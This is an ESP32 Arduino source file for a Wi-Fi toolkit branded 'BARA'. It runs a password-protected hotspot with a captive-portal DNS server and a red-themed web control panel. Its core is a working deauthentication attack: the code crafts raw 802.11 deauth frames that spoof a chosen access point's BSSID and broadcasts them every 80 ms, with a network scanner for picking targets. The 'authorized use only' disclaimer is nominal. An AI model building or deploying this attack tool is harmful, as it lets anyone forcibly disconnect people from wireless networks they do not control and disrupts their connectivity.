// ============================================================================
// 🩸 B A R A — A D V A N C E D  W I - F I  T O O L K I T  F O R  E S P 3 2 🩸
// ============================================================================
// Developed by: Ahmed Nour Ahmed | Qena, Egypt
// Purpose: Ultimate Wi-Fi penetration testing & network reconnaissance tool
// Features: Deauth attack, live scanning, captive portal, blood-hacker UI
// ============================================================================
// 🔥 WARNING: For educational & authorized testing ONLY. Misuse is illegal.
// ============================================================================

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>

// ==================== ⚙️ CONFIGURATION ====================
const char* AP_SSID = "bara";
const char* AP_PASS = "A7med@Elshab7";
const uint16_t WEB_PORT = 80;
const uint8_t MAX_NETWORKS = 50; // Scan up to 50 networks

// ==================== 🧠 GLOBAL VARIABLES ====================
DNSServer dnsServer;
AsyncWebServer server(WEB_PORT);

bool deauthActive = false;
String deauthTargetBSSID = "";
unsigned long lastDeauthTime = 0;
const unsigned long DEAUTH_INTERVAL_MS = 80; // Aggressive: 80ms between packets

// For scan results (static allocation for stability)
struct WiFiNetwork {
    String bssid;
    String ssid;
    int32_t rssi;
    uint8_t channel;
};

WiFiNetwork scannedNetworks[MAX_NETWORKS];
uint8_t scannedCount = 0;
bool scanInProgress = false;

// ==================== 🌐 HTML / CSS / JS (BLOOD-HACKER THEME) ====================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🩸 BARA WI-FI TOOLKIT 🩸</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💀</text></svg>">
    <style>
        :root {
            --blood-red: #ff0000;
            --dark-bg: #0a0000;
            --glow: 0 0 15px #ff0000, 0 0 30px #800000;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: var(--dark-bg) url("data:image/svg+xml,%3Csvg width='100' height='100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M20,20 Q40,5 60,20 T100,20 L100,100 L0,100 L0,20 Z' fill='none' stroke='%23ff0000' stroke-opacity='0.07' stroke-width='2'/%3E%3C/svg%3E");
            color: #ff3333;
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
            position: relative;
        }
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 10% 20%, rgba(255,0,0,0.07) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(255,0,0,0.09) 0%, transparent 45%);
            pointer-events: none;
            z-index: -1;
        }
        .blood-drop {
            position: absolute;
            background: radial-gradient(circle, rgba(255,0,0,0.4) 0%, transparent 70%);
            border-radius: 50%;
            opacity: 0;
            animation: fall 12s infinite ease-in;
        }
        @keyframes fall {
            0% { transform: translateY(-100px); opacity: 0; }
            10% { opacity: 0.7; }
            90% { opacity: 0.5; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            text-align: center;
            margin: 20px 0 30px;
            position: relative;
        }
        h1 {
            font-size: 3.2em;
            color: var(--blood-red);
            text-shadow: var(--glow);
            letter-spacing: 3px;
            margin-bottom: 8px;
            animation: pulse 3s infinite;
        }
        @keyframes pulse {
            0%, 100% { text-shadow: 0 0 15px #ff0000, 0 0 30px #800000; }
            50% { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff0000, 0 0 70px #800000; }
        }
        .subtitle {
            color: #ff6666;
            font-size: 1.1em;
            margin-top: 5px;
        }
        .card {
            background: rgba(20, 0, 0, 0.6);
            border: 1px solid var(--blood-red);
            border-radius: 12px;
            padding: 22px;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
            backdrop-filter: blur(2px);
        }
        .card h2 {
            color: #ff5555;
            margin-bottom: 15px;
            font-size: 1.6em;
            text-shadow: 0 0 8px rgba(255,0,0,0.5);
        }
        .status-bar {
            padding: 12px;
            margin: 15px 0;
            border-radius: 8px;
            font-weight: bold;
            text-align: center;
            background: rgba(0,0,0,0.7);
            border: 1px solid #ff4444;
        }
        .btn {
            background: var(--blood-red);
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 8px 5px;
            border-radius: 6px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            transition: all 0.3s;
            box-shadow: 0 0 12px rgba(255,0,0,0.6);
        }
        .btn:hover {
            background: #cc0000;
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 0 20px rgba(255,0,0,0.9);
        }
        .btn:active { transform: translateY(1px); }
        .input-group {
            margin: 15px 0;
        }
        input[type="text"] {
            padding: 12px;
            width: 280px;
            background: rgba(0,0,0,0.8);
            border: 1px solid #ff4444;
            border-radius: 6px;
            color: #ff6666;
            font-family: monospace;
            font-size: 16px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            color: #ffaaaa;
        }
        th, td {
            padding: 12px 10px;
            text-align: left;
            border-bottom: 1px solid rgba(255,50,50,0.3);
        }
        th {
            color: #ff7777;
            font-size: 1.1em;
        }
        tr:hover {
            background: rgba(255,0,0,0.08);
        }
        .log {
            height: 160px;
            overflow-y: auto;
            background: rgba(0,0,0,0.85);
            padding: 12px;
            border: 1px solid #ff3333;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            white-space: pre-wrap;
        }
        .log div { margin: 4px 0; }
        .success { color: #55ff55; }
        .error { color: #ff4444; }
        .warning { color: #ffaa44; }
        .info { color: #aaaaff; }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #ff5555;
            font-size: 0.9em;
            opacity: 0.8;
        }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            h1 { font-size: 2.4em; }
            input[type="text"] { width: 200px; font-size: 14px; }
            .btn { padding: 10px 18px; font-size: 14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🩸 B A R A  T O O L K I T 🩸</h1>
            <div class="subtitle">Developed by Ahmed Nour Ahmed | Qena, Egypt</div>
        </header>

        <div class="card">
            <h2>⚡ SYSTEM STATUS</h2>
            <div id="status" class="status-bar">Initializing hotspot...</div>
            <button class="btn" onclick="scan()">SCAN NETWORKS</button>
            <button class="btn" onclick="toggleDeauth()">.Toggle Deauth Panel</button>
            <div id="deauthPanel" style="display:none; margin-top:15px;">
                <div class="input-group">
                    <input type="text" id="bssidInput" placeholder="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)" maxlength="17">
                    <button class="btn" onclick="startDeauth()">⚡ START DEAUTH</button>
                    <button class="btn" style="background:#800000;" onclick="stopDeauth()">⏹ STOP DEAUTH</button>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>📡 SCANNED NETWORKS (<span id="netCount">0</span>)</h2>
            <table>
                <thead>
                    <tr>
                        <th>BSSID</th>
                        <th>SSID</th>
                        <th>RSSI</th>
                        <th>CH</th>
                        <th>ACTION</th>
                    </tr>
                </thead>
                <tbody id="networkTable"></tbody>
            </table>
        </div>

        <div class="card">
            <h2>🩸 ATTACK LOGS</h2>
            <div id="logs" class="log"></div>
        </div>

        <footer>
            BARA v2.0 — The Ultimate ESP32 Wi-Fi Weapon | For Authorized Use Only
        </footer>
    </div>

    <script>
        let logs = [];
        const MAX_LOGS = 100;

        function log(msg, cls = 'info') {
            const now = new Date().toLocaleTimeString();
            const entry = `[${now}] ${msg}`;
            logs.push({text: entry, cls});
            if (logs.length > MAX_LOGS) logs.shift();
            renderLogs();
        }

        function renderLogs() {
            const el = document.getElementById('logs');
            el.innerHTML = logs.map(l => `<div class="${l.cls}">${l.text}</div>`).join('');
            el.scrollTop = el.scrollHeight;
        }

        function updateStatus(msg, cls = 'info') {
            const el = document.getElementById('status');
            el.textContent = msg;
            el.className = 'status-bar ' + cls;
        }

        async function scan() {
            try {
                updateStatus('📡 Scanning... (may take 5s)', 'warning');
                const res = await fetch('/scan');
                const data = await res.json();
                renderNetworks(data);
                updateStatus(`✅ Found ${data.length} networks`, 'success');
                log(`Scanned ${data.length} networks`, 'success');
            } catch (e) {
                updateStatus('❌ Scan failed', 'error');
                log('Scan error: ' + e.message, 'error');
            }
        }

        function renderNetworks(networks) {
            const tbody = document.getElementById('networkTable');
            const countEl = document.getElementById('netCount');
            tbody.innerHTML = '';
            countEl.textContent = networks.length;

            networks.forEach(net => {
                const row = tbody.insertRow();
                row.insertCell().textContent = net.bssid;
                row.insertCell().textContent = net.ssid || 'HIDDEN';
                row.insertCell().textContent = net.rssi + ' dBm';
                row.insertCell().textContent = net.channel;
                const btnCell = row.insertCell();
                const btn = document.createElement('button');
                btn.className = 'btn';
                btn.textContent = 'SELECT';
                btn.onclick = () => {
                    document.getElementById('bssidInput').value = net.bssid;
                    log(`Selected target: ${net.bssid}`, 'warning');
                };
                btnCell.appendChild(btn);
            });
        }

        function toggleDeauth() {
            const panel = document.getElementById('deauthPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        }

        function startDeauth() {
            const bssid = document.getElementById('bssidInput').value.trim().toUpperCase();
            if (!bssid || !/^[0-9A-F]{2}(:[0-9A-F]{2}){5}$/.test(bssid)) {
                alert('⚠️ Invalid BSSID format! Use AA:BB:CC:DD:EE:FF');
                return;
            }
            fetch(`/deauth?bssid=${encodeURIComponent(bssid)}`)
                .then(r => r.text())
                .then(msg => {
                    log(msg, 'warning');
                    updateStatus('🔥 DEAUTH ACTIVE — Target: ' + bssid, 'warning');
                })
                .catch(e => {
                    log('Deauth start error: ' + e.message, 'error');
                });
        }

        function stopDeauth() {
            fetch('/stopdeauth')
                .then(r => r.text())
                .then(msg => {
                    log(msg, 'success');
                    updateStatus('✅ Deauth stopped', 'success');
                });
        }

        // Auto-refresh status
        setInterval(() => {
            fetch('/status')
                .then(r => r.json())
                .then(data => {
                    if (data.deauthActive) {
                        updateStatus(`🔥 DEAUTH ACTIVE — ${data.target}`, 'warning');
                    }
                })
                .catch(() => {});
        }, 2000);

        // Create blood drops
        setInterval(() => {
            if (Math.random() > 0.7) {
                const drop = document.createElement('div');
                drop.className = 'blood-drop';
                drop.style.left = Math.random() * 100 + 'vw';
                drop.style.width = (Math.random() * 30 + 10) + 'px';
                drop.style.height = drop.style.width;
                drop.style.animationDuration = (8 + Math.random() * 8) + 's';
                document.body.appendChild(drop);
                setTimeout(() => drop.remove(), 15000);
            }
        }, 500);

        log('BARA Toolkit loaded. Ready for action.', 'success');
        updateStatus('✅ Hotspot active — Connect to "bara"', 'success');
    </script>
</body>
</html>
)rawliteral";

// ==================== 📡 WIFI SCAN FUNCTION ====================
String scanWiFiNetworks() {
    if (scanInProgress) return "[]";
    scanInProgress = true;

    int n = WiFi.scanNetworks(true, false, false, 300, 0); // async=false, hidden=true
    scannedCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : (n < 0 ? 0 : n);

    StaticJsonDocument<2048> doc;
    JsonArray networks = doc.to<JsonArray>();

    for (int i = 0; i < scannedCount; i++) {
        JsonObject net = networks.createNestedObject();
        net["bssid"] = WiFi.BSSIDstr(i);
        net["ssid"] = WiFi.SSID(i);
        net["rssi"] = WiFi.RSSI(i);
        net["channel"] = WiFi.channel(i);
    }

    String json;
    serializeJson(doc, json);
    scanInProgress = false;
    return json;
}

// ==================== 📡 SEND SINGLE DEAUTH PACKET ====================
void sendDeauthPacket(const uint8_t* targetBSSID) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                           // Type: Deauth
        0x3A, 0x01,                           // Duration: 314 us
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Receiver: Broadcast
        targetBSSID[0], targetBSSID[1], targetBSSID[2],
        targetBSSID[3], targetBSSID[4], targetBSSID[5], // Source = Target BSSID
        targetBSSID[0], targetBSSID[1], targetBSSID[2],
        targetBSSID[3], targetBSSID[4], targetBSSID[5], // BSSID = Target
        0x00, 0x00,                           // Sequence (static is fine for deauth)
        0x01, 0x00                            // Reason: Unspecified
    };

    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

// ==================== 🌐 WEB HANDLERS ====================
void setupWebServer() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });

    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        String json = scanWiFiNetworks();
        request->send(200, "application/json", json);
    });

    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!request->hasParam("bssid")) {
            request->send(400, "text/plain", "BSSID parameter required");
            return;
        }

        String bssid = request->getParam("bssid")->value();
        // Simple validation
        if (bssid.length() != 17) {
            request->send(400, "text/plain", "Invalid BSSID length");
            return;
        }

        uint8_t mac[6];
        int parsed = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
        if (parsed != 6) {
            request->send(400, "text/plain", "Invalid BSSID format");
            return;
        }

        deauthTargetBSSID = bssid;
        deauthActive = true;
        lastDeauthTime = millis();
        request->send(200, "text/plain", "DEAUTH ATTACK INITIATED ON: " + bssid);
    });

    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        deauthActive = false;
        request->send(200, "text/plain", "DEAUTH ATTACK STOPPED");
    });

    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        StaticJsonDocument<200> status;
        status["deauthActive"] = deauthActive;
        status["target"] = deauthActive ? deauthTargetBSSID : "";
        String json;
        serializeJson(status, json);
        request->send(200, "application/json", json);
    });

    server.begin();
}

// ==================== 🧪 SETUP ====================
void setup() {
    Serial.begin(115200);
    Serial.println("\n🩸 BARA WI-FI TOOLKIT — INITIALIZING...");

    // Enable promiscuous mode for raw packet injection
    wifi_promiscuous_filter_t filter = { .filter_mask = 0 };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    // Start SoftAP
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    WiFi.softAPdisconnect(false); // Keep AP alive

    IPAddress IP = WiFi.softAPIP();
    Serial.print("🔥 Hotspot IP: ");
    Serial.println(IP);

    // Start DNS (Captive Portal)
    dnsServer.start(53, "*", IP);

    // Web server
    setupWebServer();

    Serial.println("✅ BARA is LIVE and READY for action!");
}

// ==================== 🔁 MAIN LOOP ====================
void loop() {
    dnsServer.processNextRequest();

    // Non-blocking Deauth attack
    if (deauthActive && (millis() - lastDeauthTime >= DEAUTH_INTERVAL_MS)) {
        uint8_t targetMAC[6];
        sscanf(deauthTargetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &targetMAC[0], &targetMAC[1], &targetMAC[2],
               &targetMAC[3], &targetMAC[4], &targetMAC[5]);
        sendDeauthPacket(targetMAC);
        lastDeauthTime = millis();
    }

    delay(1); // Yield to WiFi tasks
}
